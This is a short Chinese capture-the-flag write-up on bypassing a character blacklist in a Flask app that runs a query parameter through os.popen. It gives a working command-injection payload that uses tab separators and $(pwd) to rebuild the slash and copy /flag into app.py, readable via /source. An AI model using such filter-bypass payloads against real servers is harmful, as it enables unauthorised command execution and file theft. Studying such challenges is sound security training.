# 知识点
命令执行<br />$()
> $()相当于` `，可以执行命令

[Linux—shell中$(( ))、$( )、``与${ }的区别 - chengd - 博客园](https://www.cnblogs.com/chengd/p/7803664.html#:~:text=Linux%E2%80%94shell%E4%B8%AD%24%28%28%20%29%29%E3%80%81%24%28%20%29%E3%80%81%60%60%E4%B8%8E%24%7B%20%7D%E7%9A%84%E5%8C%BA%E5%88%AB,%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%20%E5%9C%A8bash%E4%B8%AD%EF%BC%8C%24%28%20%29%E4%B8%8E%60%20%60%EF%BC%88%E5%8F%8D%E5%BC%95%E5%8F%B7%EF%BC%89%E9%83%BD%E6%98%AF%E7%94%A8%E6%9D%A5%E4%BD%9C%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E7%9A%84%E3%80%82%20%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E4%B8%8E%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E9%83%BD%E6%98%AF%E7%94%A8%E6%9D%A5%E9%87%8D%E7%BB%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%85%88%E5%AE%8C%E6%88%90%E5%BC%95%E5%8F%B7%E9%87%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E5%85%B6%E7%BB%93%E6%9E%9C%E6%9B%BF%E6%8D%A2%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%86%8D%E9%87%8D%E7%BB%84%E6%88%90%E6%96%B0%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82)
# 思路
```php

from flask import Flask, request, make_response
import uuid
import os

# flag in /flag
app = Flask(__name__)

def waf(rce):
    black_list = '01233456789un/|{}*!;@#\n`~\'\"><=+-_ '
    # black_list = ''
    for black in black_list:
        if black in rce:
            return False
    return True

@app.route('/', methods=['GET'])
def index():
    if request.args.get("Ňśś"):
        nss = request.args.get("Ňśś")
        if waf(nss):
            os.popen(nss)
        else:
            return "waf"
    return "/source"


@app.route('/source', methods=['GET'])
def source():
    src = open("app.py", 'rb').read()
    return src

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=9000)

```
保留字母，但是过滤了斜杠，我们可以尝试使用$(pwd)来获取 /<br />不断cd到根目录，然后执行pwd获取/<br />从而将/flag中的内容复制到app.py中
```php
cp%09$(cd%09..&&cd%09..&&cd%09..&&cd%09..&&cd%09..&&cd%09..&&cd%09..&&cd%09..%09echo%09$(pwd)flag)%09app.py
```
访问/source获取flag

